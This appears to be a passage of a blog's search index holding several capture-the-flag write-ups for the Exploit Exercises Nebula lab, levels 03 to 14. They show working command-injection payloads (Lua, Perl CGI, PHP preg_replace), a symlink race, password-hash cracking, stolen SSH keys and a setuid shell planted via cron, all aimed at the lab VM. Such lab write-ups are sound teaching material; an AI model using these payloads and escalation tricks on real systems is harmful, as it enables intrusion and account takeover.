0x080484f4 in main () (gdb) print $eax $1 = 1014 (gdb) set $eax = 1000 (gdb) print $eax $2 = 1000  Next, we check $eax, which is currently set at 1014. Looking back at the source code, this UID will cause us to fall into the if block and generate the error message, so we modify $eax to our fake id of 1000.\nAs we continue, the if statement evaluates to false and we are presented with the token.\n (gdb) cont Continuing. your token is b705702b-76a8-42b0-8844-3adabbe5ac58 [Inferior 1 (process 3567) exited with code 063]  Let\u0026rsquo;s try logging into the flag13 account with the token:\n $ ssh flag13@192.168.98.138 _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \\/ __ \\/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\\___/_.___/\\__,_/_/\\__,_/ exploit-exercises.com/nebula For level descriptions, please see the above URL. To log in, use the username of \u0026quot;levelXX\u0026quot; and password \u0026quot;levelXX\u0026quot;, where XX is the level number. Currently there are 20 levels (00 - 19). flag13@192.168.98.138's password: Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686) * Documentation: https://help.ubuntu.com/ New release '12.04 LTS' available. Run 'do-release-upgrade' to upgrade to it. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. flag13@nebula:~$ id uid=986(flag13) gid=986(flag13) groups=986(flag13) flag13@nebula:~$ getflag You have successfully executed getflag on a target account  It worked. This was one of my favorite levels so far!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level13/"
  },{
    "title": "Exploit Exercises Nebula Level14",
    "date": "",
    "description": "",
    "body": "Level14 provides us with these instructions:\n\u0026ldquo;This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)\u0026rdquo;\nA quick test of the program helps us to understand the \u0026ldquo;encryption\u0026rdquo;.\n level14@nebula:/home/flag14$ ./flag14 -e aaaaaaaaaa abcdefghij  It appears that each character is rotated by its index (starting with 0).\n aaaaaaaaaa 0123456789 abcdefghij  Let\u0026rsquo;s check the token file:\n level14@nebula:/home/flag14$ cat token 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.  A quick python program should do the trick.\n level14@nebula:~$ cat decrypt.py #!/usr/bin/python import sys if len(sys.argv) != 2: print \u0026quot;Usage: decrypt.py \u0026lt;ciphertext\u0026gt;\u0026quot; exit(0) def decrypt(ciphertext): count = 0 result = \u0026quot;\u0026quot; for x in ciphertext: result += chr((ord(x) - count)) count +=1 print(\u0026quot;Original: \u0026quot; + ciphertext ) print(\u0026quot;Decrypted: \u0026quot; + result ) decrypt(sys.argv[1])  Let\u0026rsquo;s run it with the provided token:\n level14@nebula:~$ python /home/level14/decrypt.py 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW. Original: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW. Decrypted: 8457c118-887c-4e40-a5a6-33a25353165  Time to test the creds:\n level14@nebula:~$ ssh flag14@localhost The authenticity of host 'localhost (127.0.0.1)' can't be established. RSA key fingerprint is 0c:53:41:04:c0:99:8c:5c:7a:59:aa:32:7c:da:60:db. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added 'localhost' (RSA) to the list of known hosts. _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \\/ __ \\/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\\___/_.___/\\__,_/_/\\__,_/ exploit-exercises.com/nebula For level descriptions, please see the above URL. To log in, use the username of \u0026quot;levelXX\u0026quot; and password \u0026quot;levelXX\u0026quot;, where XX is the level number. Currently there are 20 levels (00 - 19). flag14@localhost's password: Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686) * Documentation: https://help.ubuntu.com/ New release '12.04 LTS' available. Run 'do-release-upgrade' to upgrade to it. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. flag14@nebula:~$ id uid=985(flag14) gid=985(flag14) groups=985(flag14) flag14@nebula:~$ getflag You have successfully executed getflag on a target account  Thanks for reading!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level14/"
  },{
    "title": "Exploit Exercises Nebula Level11",
    "date": "",
    "description": "",
    "body": "Level11 provides us with the source code for level11.c:\n #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; /* * Return a random, non-predictable file, and return the file descriptor for it. */ int getrand(char **path) { char *tmp; int pid; int fd; srandom(time(NULL)); tmp = getenv(\u0026quot;TEMP\u0026quot;); pid = getpid(); asprintf(path, \u0026quot;%s/%d.%c%c%c%c%c%c\u0026quot;, tmp, pid, 'A' + (random() % 26), '0' + (random() % 10), 'a' + (random() % 26), 'A' + (random() % 26), '0' + (random() % 10), 'a' + (random() % 26)); fd = open(*path, O_CREAT|O_RDWR, 0600); unlink(*path); return fd; } void process(char *buffer, int length) { unsigned int key; int i; key = length \u0026amp; 0xff; for(i = 0; i \u0026lt; length; i++) { buffer[i] ^= key; key -= buffer[i]; } system(buffer); } #define CL \u0026quot;Content-Length: \u0026quot; int main(int argc, char **argv) { char line[256]; char buf[1024]; char *mem; int length; int fd; char *path; if(fgets(line, sizeof(line), stdin) == NULL) { errx(1, \u0026quot;reading from stdin\u0026quot;); } if(strncmp(line, CL, strlen(CL)) != 0) { errx(1, \u0026quot;invalid header\u0026quot;); } length = atoi(line + strlen(CL)); if(length \u0026lt; sizeof(buf)) { if(fread(buf, length, 1, stdin) != length) { err(1, \u0026quot;fread length\u0026quot;); } process(buf, length); } else { int blue = length; int pink; fd = getrand(\u0026amp;path); while(blue \u0026gt; 0) { printf(\u0026quot;blue = %d, length = %d, \u0026quot;, blue, length); pink = fread(buf, 1, sizeof(buf), stdin); printf(\u0026quot;pink = %d\\n\u0026quot;, pink); if(pink \u0026lt;= 0) { err(1, \u0026quot;fread fail(blue = %d, length = %d)\u0026quot;, blue, length); } write(fd, buf, pink); blue -= pink; } mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0); if(mem == MAP_FAILED) { err(1, \u0026quot;mmap\u0026quot;); } process(mem, length); } }  \u0026ldquo;There are two ways of completing this level, you may wish to do both :-)\u0026rdquo; - That sounds cool. Let\u0026rsquo;s take a look.\nSorry folks, but this one completely stumped me. I thought I had a working exploit but could not successfully run getflag.\n level11@nebula:~$ export TEMP=/tmp level11@nebula:~$ python foobar.py | /home/flag11/flag11 python foobar.py | /home/flag11/flag11 blue = 1024, length = 1024, pink = 1024 getflag is executing on a non-flag account, this doesn't count  I believe the issue has to do with system(), this excerpt from the man page appears to confirm my suspicion:\n\u0026ldquo;system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup.\u0026rdquo;\n level11@nebula:~$ bash --version bash --version GNU bash, version 4.2.10(1)-release (i686-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.  I did take a look around at other solutions and could not find a recent write-up that had success with this level.\nIf anyone has better luck or a solution, let me know on Twitter!\nThanks!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level11/"
  },{
    "title": "Exploit Exercises Nebula Level12",
    "date": "",
    "description": "",
    "body": "Level12 informs us that \u0026ldquo;There is a backdoor process listening on port 50001.\u0026rdquo;\nWe are also provided with level12.lua:\n local socket = require(\u0026quot;socket\u0026quot;) local server = assert(socket.bind(\u0026quot;127.0.0.1\u0026quot;, 50001)) function hash(password) prog = io.popen(\u0026quot;echo \u0026quot;..password..\u0026quot; | sha1sum\u0026quot;, \u0026quot;r\u0026quot;) data = prog:read(\u0026quot;*all\u0026quot;) prog:close() data = string.sub(data, 1, 40) return data end while 1 do local client = server:accept() client:send(\u0026quot;Password: \u0026quot;) client:settimeout(60) local line, err = client:receive() if not err then print(\u0026quot;trying \u0026quot; .. line) -- log from where ;\\ local h = hash(line) if h ~= \u0026quot;4754a4f4bd5787accd33de887b9250a0691dd198\u0026quot; then client:send(\u0026quot;Better luck next time\\n\u0026quot;); else client:send(\u0026quot;Congrats, your token is 413**CARRIER LOST**\\n\u0026quot;) end end client:close() end  The above code accepts user input, hashes it, and compares it to a hard coded hash. The line that drew my attention was here:\n prog = io.popen(\u0026quot;echo \u0026quot;..password..\u0026quot; | sha1sum\u0026quot;, \u0026quot;r\u0026quot;)  I found a great write-up on io.popen on Full Disclosure from May 2014.\n\u0026ldquo;In Lua, this kind of vulnerability occurs, for example, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions.\u0026rdquo;\nThat sounds like the exact code we are looking at - unvalidated user data via the io.popen() Lua function.\nLet\u0026rsquo;s attempt command injection:\n level12@nebula:/home/flag12$ nc 127.0.0.1 50001 Password: $(whoami \u0026gt; /home/flag12/foo) Better luck next time level12@nebula:/home/flag12$ ls flag12.lua foo level12@nebula:/home/flag12$ cat foo flag12  It worked! Since the output verified that the system commands are running as flag12, we should be able to execute getflag:\n level12@nebula:/home/flag12$ nc 127.0.0.1 50001 Password: $(getflag \u0026gt; /home/flag12/bar) Better luck next time level12@nebula:/home/flag12$ ls bar flag12.lua foo level12@nebula:/home/flag12$ cat bar You have successfully executed getflag on a target account  Thanks for reading!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level12/"
  },{
    "title": "Exploit Exercises Nebula Level08",
    "date": "",
    "description": "",
    "body": "\u0026ldquo;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.\u0026rdquo;\nThis was the verbiage provided in the About section for level08.\nThe first step I took was to check the home directory for flag08.\n level08@nebula:/home/flag08$ ls -l total 9 -rw-r--r-- 1 root root 8302 2011-11-20 21:22 capture.pcap  It contained a world readable capture file, let\u0026rsquo;s see what the \u0026ldquo;the user was up to.\u0026rdquo; I ran the capture file through tcpdump to search for any credentials:\n level08@nebula:/home/flag08$ tcpdump -nnAr capture.pcap | grep -i pass reading from file capture.pcap, link-type EN10MB (Ethernet) **Password: **  It appears that password is mentioned in the output. I could move capture.pcap off the system and run it through wireshark to follow the TCP stream, but decided to stick to the command-line.\nI used the tool tcpflow to follow the users activity:\n level08@nebula:/home/flag08$ tcpflow -C -r capture.pcap ..% ..% ..\u0026amp;..... ..#..'..$ ..\u0026amp;..... ..#..'..$ .. .....#.....'......... .. .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.. ........\u0026quot;........! ........\u0026quot;..\u0026quot;.....b........b.....B. ..............................1.......! ..\u0026quot;.... ..\u0026quot;.... ..!...........\u0026quot; ........\u0026quot; ..\u0026quot;................ ..................... Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10) ..wwwbugs login: l .l e .e v .v e .e l .l 8 .8 . . Password: b a c k d o o r . . . 0 0 R m 8 . a t e . . . Login incorrect wwwbugs login:  The capture caught the user attempting to login to wwwbugs. The login was incorrect, but may have been mistyped.\nThe output contains a few deletions, which confirms that the user had forgotten some details like \u0026ldquo;m8\u0026rdquo; vs. \u0026ldquo;mate.\u0026rdquo; Let\u0026rsquo;s try to login using \u0026ldquo;backd00Rmate\u0026rdquo;:\n level08@nebula:/home/flag08$ su flag08 Password: sh-4.2$ id uid=991(flag08) gid=991(flag08) groups=991(flag08) sh-4.2$ getflag You have successfully executed getflag on a target account  Looks like the password I chose was correct. The tricky part of this challenge was finding the \u0026ldquo;login incorrect\u0026rdquo; statement, which steered me away from using other combinations of \u0026ldquo;backdoor\u0026hellip;00Rm8.ate\u0026rdquo;\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level08/"
  },{
    "title": "Exploit Exercises Nebula Level09",
    "date": "",
    "description": "",
    "body": "Level09 provides us with a C setuid wrapper for some vulnerable PHP code.\n \u0026lt;?php function spam($email) { $email = preg_replace(\u0026quot;/\\./\u0026quot;, \u0026quot; dot \u0026quot;, $email); $email = preg_replace(\u0026quot;/@/\u0026quot;, \u0026quot; AT \u0026quot;, $email); return $email; } function markup($filename, $use_me) { $contents = file_get_contents($filename); $contents = preg_replace(\u0026quot;/(\\[email (.*)\\])/e\u0026quot;, \u0026quot;spam(\\\u0026quot;\\\\2\\\u0026quot;)\u0026quot;, $contents); $contents = preg_replace(\u0026quot;/\\[/\u0026quot;, \u0026quot;\u0026lt;\u0026quot;, $contents); $contents = preg_replace(\u0026quot;/\\]/\u0026quot;, \u0026quot;\u0026gt;\u0026quot;, $contents); return $contents; } $output = markup($argv[1], $argv[2]); print $output; ?\u0026gt;  As you can see in the code above, the second argument \u0026ndash; $use_me \u0026ndash; is not used in the code.\nAfter doing some research, multiple sources identified preg_replace() as a dangerous feature that was deprecated in PHP 5.5.0 and removed as of PHP 7.0.0.\nThis link provided useful information on the feature and even provided an example for exploitation.\nLet\u0026rsquo;s inject our getflag command into the $use_me argument using the exploitation method from the link:\n level09@nebula:/home/flag09$ echo '[email {${system($use_me)}}]' \u0026gt; /tmp/useme level09@nebula:~$ cd /home/flag09/ level09@nebula:/home/flag09$ ./flag09 /tmp/useme getflag You have successfully executed getflag on a target account PHP Notice: Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1  Looks like the injection was successful - we receive the output that indicates getflag was successfully executed.\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level09/"
  },{
    "title": "Exploit Exercises Nebula Level10",
    "date": "",
    "description": "",
    "body": "level10 provides us with the following source code:\n #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char *file; char *host; if(argc \u0026lt; 3) { printf(\u0026quot;%s file host\\n\\tsends file to host if you have access to it\\n\u0026quot;, argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(\u0026quot;Connecting to %s:18211 .. \u0026quot;, host); fflush(stdout); fd = socket(AF_INET, SOCK_STREAM, 0); memset(\u0026amp;sin, 0, sizeof(struct sockaddr_in)); sin.sin_family = AF_INET; sin.sin_addr.s_addr = inet_addr(host); sin.sin_port = htons(18211); if(connect(fd, (void *)\u0026amp;sin, sizeof(struct sockaddr_in)) == -1) { printf(\u0026quot;Unable to connect to host %s\\n\u0026quot;, host); exit(EXIT_FAILURE); } #define HITHERE \u0026quot;.oO Oo.\\n\u0026quot; if(write(fd, HITHERE, strlen(HITHERE)) == -1) { printf(\u0026quot;Unable to write banner to host %s\\n\u0026quot;, host); exit(EXIT_FAILURE); } #undef HITHERE printf(\u0026quot;Connected!\\nSending file .. \u0026quot;); fflush(stdout); ffd = open(file, O_RDONLY); if(ffd == -1) { printf(\u0026quot;Damn. Unable to open file\\n\u0026quot;); exit(EXIT_FAILURE); } rc = read(ffd, buffer, sizeof(buffer)); if(rc == -1) { printf(\u0026quot;Unable to read from file: %s\\n\u0026quot;, strerror(errno)); exit(EXIT_FAILURE); } write(fd, buffer, rc); printf(\u0026quot;wrote file!\\n\u0026quot;); } else { printf(\u0026quot;You don't have access to %s\\n\u0026quot;, file); } }  This challenge is a tough one, we need to trigger the race condition within the code.\nThe man page for access() confirms the suspicion: \u0026ldquo;Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.\u0026rdquo; - Let\u0026rsquo;s see if we can cause that to occur on line 24.\nI decided against using my local machine to run some of the listeners, so I opened a few terminals (four, to be exact) and logged in as the level10 user.\nIn the first terminal, I create a fake token in \u0026ldquo;/tmp/fake\u0026rdquo; which contains the string \u0026ldquo;foo\u0026rdquo;. I use a while loop to create an infinite loop creating the symbolic link.\n level10@nebula:~$ echo \u0026quot;foo\u0026quot; \u0026gt; /tmp/fake level10@nebula:~$ while true; do ln -fs /tmp/fake token; ln -fs /home/flag10/token token; done  The next terminal contains another infinite loop containing my netcat listener (on port 18211 which was specified on line 38 of the original c code) that redirects the output to a file named \u0026ldquo;out\u0026rdquo;.\n level10@nebula:~$ while true; do nc -l 18211 \u0026gt;\u0026gt; out; done  The third terminal is used to call the flag10 program and provide my token using 127.0.0.1 as the host. This is also placed in an infinite loop, it will need to execute a number of times to trigger the race condition.\n level10@nebula:~$ while true; do /home/flag10/flag10 /home/level10/token 127.0.0.1; done  Finally, the last terminal tails my output file. I use this to watch for the token:\n level10@nebula:~$ tail -f out .oO Oo. foo .oO Oo. foo .oO Oo. foo .oO Oo. 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27 .oO Oo. foo  Looks like the token is 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27. Let\u0026rsquo;s check to see if that is the password for the flag10 user:\n level10@nebula:~$ su flag10 Password: sh-4.2$ id uid=989(flag10) gid=989(flag10) groups=989(flag10) sh-4.2$ getflag You have successfully executed getflag on a target account  While I could have used bg and fg to minimize the amount of terminals I needed to use, I was simply building upon each step that I took. If I had a clearer solution for this challenge, I would have simply written a short python script to accomplish the goal.\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level10/"
  },{
    "title": "Exploit Exercises Nebula Level07",
    "date": "",
    "description": "",
    "body": "The next level provides us with some perl code:\n #!/usr/bin/perl use CGI qw{param}; print \u0026quot;Content-type: text/html\\n\\n\u0026quot;; sub ping { $host = $_[0]; print(\u0026quot;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Ping results\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;pre\u0026gt;\u0026quot;); @output = `ping -c 3 $host 2\u0026gt;\u0026amp;1`; foreach $line (@output) { print \u0026quot;$line\u0026quot;; } print(\u0026quot;\u0026lt;/pre\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026quot;); } # check if Host set. if not, display normal page, etc ping(param(\u0026quot;Host\u0026quot;));  After logging into the system, I looked at the home directory for flag07:\n level07@nebula:/home/flag07$ ls -l total 5 -rwxr-xr-x 1 root root 368 2011-11-20 21:22 index.cgi -rw-r--r-- 1 root root 3719 2011-11-20 21:22 thttpd.conf  It appears that the perl code provided is running on a web server. I investigated the contents of thttpd.conf to glean some more information:\n # Specifies an alternate port number to listen on. port=7007 # Specifies what user to switch to after initialization when started as root. user=flag07  The config file reveals that the web server is running on port 7007 as the flag07 user.\n $ curl http://192.168.98.138:7007/index.cgi \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Ping results\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;pre\u0026gt;Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline] [-p pattern] [-s packetsize] [-t ttl] [-I interface] [-M pmtudisc-hint] [-m mark] [-S sndbuf] [-T tstamp-options] [-Q tos] [hop1 ...] destination  A quick curl command confirms that the web server is up, accessible, and running the perl ping code.\nThe code does not appear to be performing any input validation so lets try sending a semi-colon and an additional command at the Host parameter:\n $ curl http://192.168.98.138:7007/index.cgi?Host=%3B%20pwd \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Ping results\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;pre\u0026gt;/home/flag07  Awesome! As you can see in the output, we can inject and run commands. Since the web server is running as flag07, let\u0026rsquo;s run getflag.\n $ curl http://192.168.98.138:7007/index.cgi?Host=%3B%20getflag \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Ping results\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;pre\u0026gt;You have successfully executed getflag on a target account  The command executed successfully. On to level08!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level07/"
  },{
    "title": "Exploit Exercises Nebula Level06",
    "date": "",
    "description": "",
    "body": "Level06 specifies that \u0026ldquo;The flag06 account credentials came from a legacy unix system.\u0026rdquo;\nI believe the hint spells out exactly what we need to solve this level.\nLegacy unix systems stored the password hashes in /etc/passwd, which is world-readable. Modern systems use the shadow file to store this sensitive information.\nA quick grep statement should confirm if my suspicions are correct.\n level06@nebula:~$ grep flag06 /etc/passwd flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh  Perfect, the line for the flag06 account contains a password hash instead of the \u0026lsquo;x\u0026rsquo; that would be displayed on a modern system utilizing /etc/shadow.\nTime to fire up John the Ripper to crack the hash:\n foo@kali:~$ john flag06 Using default input encoding: UTF-8 Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status hello (flag06) 1g 0:00:00:00 DONE 2/3 (2016-02-06 01:17) 100.0g/s 881200p/s 881200c/s 881200C/s 123456..nutmegs Use the \u0026quot;--show\u0026quot; option to display all of the cracked passwords reliably Session completed  John quickly identifies the password as \u0026lsquo;hello\u0026rsquo;. Time to test:\n level06@nebula:~$ ssh flag06@localhost The authenticity of host 'localhost (127.0.0.1)' can't be established. RSA key fingerprint is 67:fe:f4:09:cd:0f:ba:dd:87:2b:73:2c:80:31:c2:68. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added 'localhost' (RSA) to the list of known hosts. _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \\/ __ \\/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\\___/_.___/\\__,_/_/\\__,_/ exploit-exercises.com/nebula For level descriptions, please see the above URL. To log in, use the username of \u0026quot;levelXX\u0026quot; and password \u0026quot;levelXX\u0026quot;, where XX is the level number. There are currently 20 levels (00 - 19). flag06@localhost's password: Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686) * Documentation: https://help.ubuntu.com/ New release '12.04 LTS' available. Run 'do-release-upgrade' to upgrade to it. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. flag06@nebula:~$ getflag You have successfully executed getflag on a target account  The password worked, I was able to successfully log into the flag06 account and run getflag.\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level06/"
  },{
    "title": "Exploit Exercises - Nebula Level05",
    "date": "",
    "description": "",
    "body": "[Level05] instructs us to \u0026ldquo;Check the flag05 home directory. You are looking for weak directory permissions\u0026rdquo;\nAfter navigating over to /home/flag05, we take a look at the permissions.\n level05@nebula:~$ pushd /home/flag05/ level05@nebula:/home/flag05$ ls -al total 5 drwxr-x--- 4 flag05 level05 93 2012-08-18 06:56 . drwxr-xr-x 1 root root 80 2012-08-27 07:18 .. drwxr-xr-x 2 flag05 flag05 42 2011-11-20 20:13 .backup -rw-r--r-- 1 flag05 flag05 220 2011-05-18 02:54 .bash_logout -rw-r--r-- 1 flag05 flag05 3353 2011-05-18 02:54 .bashrc -rw-r--r-- 1 flag05 flag05 675 2011-05-18 02:54 .profile drwx------ 2 flag05 flag05 70 2011-11-20 20:13 .ssh  That hidden backup directory looks interesting \u0026ndash; it has world-readable and execute permissions set. Let\u0026rsquo;s see what it contains:\n level05@nebula:/home/flag05$ cd .backup/ level05@nebula:/home/flag05/.backup$ ls -al total 2 drwxr-xr-x 2 flag05 flag05 42 2011-11-20 20:13 . drwxr-x--- 4 flag05 level05 93 2012-08-18 06:56 .. -rw-rw-r-- 1 flag05 flag05 1826 2011-11-20 20:13 backup-19072011.tgz  Looks like it\u0026rsquo;s a backup. Let\u0026rsquo;s extract it to the level05 home directory and see its contents:\n level05@nebula:/home/flag05/.backup$ tar -xzvf backup-19072011.tgz -C /home/level05/ .ssh/ .ssh/id_rsa.pub .ssh/id_rsa .ssh/authorized_keys  The output shows a public/private key pair. Let\u0026rsquo;s attempt to log into the box as flag05 using the keys.\n level05@nebula:/home/flag05/.backup$ popd level05@nebula:~$ ls .ssh authorized_keys id_rsa id_rsa.pub level05@nebula:~$ ssh flag05@localhost The authenticity of host 'localhost (127.0.0.1)' can't be established. RSA key fingerprint is 67:fe:f4:09:cd:0f:ba:dd:87:2b:73:2c:80:31:c2:68. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added 'localhost' (RSA) to the list of known hosts. _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \\/ __ \\/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\\___/_.___/\\__,_/_/\\__,_/ exploit-exercises.com/nebula For level descriptions, please see the above URL. To log in, use the username of \u0026quot;levelXX\u0026quot; and password \u0026quot;levelXX\u0026quot;, where XX is the level number. Currently there are 20 levels (00 - 19). Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686) * Documentation: https://help.ubuntu.com/ New release '12.04 LTS' available. Run 'do-release-upgrade' to upgrade to it. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. flag05@nebula:~$ getflag You have successfully executed getflag on a target account  That worked! After logging into the box as flag05, I ran the getflag command to verify completion of level05.\n",
    "ref": "/blog/exploit-exercises-nebula-level05/"
  },{
    "title": "Quick Update",
    "date": "",
    "description": "",
    "body": "Hi All,\nIt has been about two months since my last post. It looks like exploit-exercises is offline (and has been for awhile). I will continue my Nebula write-ups if it ever comes back up, but for now I will move on and continue with some new content.\nI should have another post coming soon, so stay tuned!\nMike\n",
    "ref": "/blog/quick-update/"
  },{
    "title": "Exploit Exercises - Nebula Level03",
    "date": "",
    "description": "",
    "body": "The details page for Level03 contains a hint directing us to the home directory of flag03. After navigating to the target home directory and listing out the files, I was presented with a shell script called writable.sh and a directory called writable.d.\nI took a look at the shell script and it contained the following:\n#!/bin/sh for i in /home/flag03/writable.d/* ; do (ulimit -t 5; bash -x \u0026quot;$i\u0026quot;) rm -f \u0026quot;$i\u0026quot; done  This code will execute anything placed in the writable.d directory when it is called. The details section also mentioned a crontab that is called every couple of minutes.\nThis challenge was a little tougher because I wanted to gain shell access and not just cat out a log file that contained the getflag output. After trying to approach the problem the same way as Level00, I came up short because bash will ignore the SUID bit.\nI went with a different approach and after grabbing the uid/gid from /etc/passwd I created some code to spawn a shell.\n#include \u0026lt;stdio.h\u0026gt; int main() { setresuid(996, 996, 996); setresgid(996, 996, 996); system( \u0026quot;/bin/bash\u0026quot; ); return 0; }  Then, I placed a bash script in writable.d that will compile my code.\n#!/bin/bash gcc /tmp/foo.c -o /home/flag03/level03 chmod +xs /home/flag03/level03  I waited for cron to run, then moved to /home/flag03 and executed my newly compiled level03 program.\nlevel04@nebula:/home/flag03$ id uid=1004(level03) gid=1004(level03) groups=1004(level03) level03@nebula:/home/flag03$ ./level03 flag03@nebula:/home/flag03$ id uid=996(flag03) gid=996(flag03) groups=996(flag03),1004(level03) flag03@nebula:/home/flag03$ getflag You have successfully executed getflag on a target account  Success! After running the program I was presented with a shell and able to run getflag on a target account.\nThanks for reading!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level03/"
  },{
    "title": "Exploit Exercises - Nebula Level04",
    "date": "",
    "description": "",
    "body": "Level04 was one of my favorite challenges out of the entire series. The post below documents my solution.\nWe are presented with the source code for level4.c. I included the code below for a quick reference:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; int main(int argc, char **argv, char **envp) { char buf[1024]; int fd, rc; if(argc == 1) { printf(\u0026quot;%s [file to read]\\n\u0026quot;, argv[0]); exit(EXIT_FAILURE); } if(strstr(argv[1], \u0026quot;token\u0026quot;) != NULL) { printf(\u0026quot;You may not access '%s'\\n\u0026quot;, argv[1]); exit(EXIT_FAILURE); } fd = open(argv[1], O_RDONLY); if(fd == -1) { err(EXIT_FAILURE, \u0026quot;Unable to open %s\u0026quot;, argv[1]); } rc = read(fd, buf, sizeof(buf)); if(rc == -1) { err(EXIT_FAILURE, \u0026quot;Unable to read fd %d\u0026quot;, fd); } write(1, buf, rc); }  At first glance I made the problem too complicated and began looking into file permissions, etc. After resetting myself I concentrated on the source code provided and noticed a common programming mistake. The second if statement explicitly states the file that the programmer does not want accessed. Since the code is matching based on name we should be able to create a symbolic link to display the contents of token.\nlevel04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/level04 level04@nebula:/home/flag04$ ./flag04 /tmp/level04 06508b5e-8909-4f38-b630-fdb148a848a2 level04@nebula:/home/flag04$ id uid=1005(level04) gid=1005(level04) groups=1005(level04) level04@nebula:/home/flag04$ su flag04 Password: sh-4.2$ id uid=995(flag04) gid=995(flag04) groups=995(flag04) sh-4.2$ getflag You have successfully executed getflag on a target account  There you have it! By evading the name-based filter we were able to read the restricted files contents.\nJust a quick note: I used the contents of token as the password in order to su to the flag04 account. Hope this 